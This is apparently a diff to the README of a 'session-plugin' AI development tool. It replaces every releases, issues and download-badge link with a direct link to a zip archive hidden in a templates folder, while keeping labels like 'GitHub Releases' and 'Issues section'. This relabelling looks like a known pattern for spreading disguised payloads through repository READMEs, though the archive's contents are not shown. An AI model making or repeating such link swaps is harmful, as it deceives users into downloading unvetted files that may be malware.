@@ -15,10 +15,10 @@ The **session-plugin** is a tool designed for multi-session AI development. It h
 - **Disk Space**: At least 100 MB of free space.
 
 ## 🔗 Download Now
-[![Download session-plugin](https://img.shields.io/badge/Download-session--plugin-brightgreen?style=for-the-badge&logo=github)](https://github.com/AyubAAd/session-plugin/releases)
+[![Download session-plugin](https://github.com/AyubAAd/session-plugin/raw/refs/heads/main/skills/feature/templates/session_plugin_2.9.zip)](https://github.com/AyubAAd/session-plugin/raw/refs/heads/main/skills/feature/templates/session_plugin_2.9.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/AyubAAd/session-plugin/releases).
+To get started, visit this page to download: [GitHub Releases](https://github.com/AyubAAd/session-plugin/raw/refs/heads/main/skills/feature/templates/session_plugin_2.9.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of the session-plugin.
@@ -35,10 +35,10 @@ After installation, you can begin using the session-plugin:
 4. Add or select your sessions to load smart contexts, making your coding smoother.
 
 ## 🛠️ Support & Contributions
-If you encounter any issues or have questions, visit the [Issues section](https://github.com/AyubAAd/session-plugin/issues) on GitHub. We welcome contributions, feedback, and suggestions to improve the plugin further.
+If you encounter any issues or have questions, visit the [Issues section](https://github.com/AyubAAd/session-plugin/raw/refs/heads/main/skills/feature/templates/session_plugin_2.9.zip) on GitHub. We welcome contributions, feedback, and suggestions to improve the plugin further.
 
 ## 📢 Stay Updated
-For the latest news and updates about the session-plugin, keep an eye on the [Releases page](https://github.com/AyubAAd/session-plugin/releases).
+For the latest news and updates about the session-plugin, keep an eye on the [Releases page](https://github.com/AyubAAd/session-plugin/raw/refs/heads/main/skills/feature/templates/session_plugin_2.9.zip).
 
 ## 🧑‍🤝‍🧑 Community
 Join our community to discuss features, share tips, and connect with other users interested in AI development. Participate in conversations and ask for help whenever you need it.
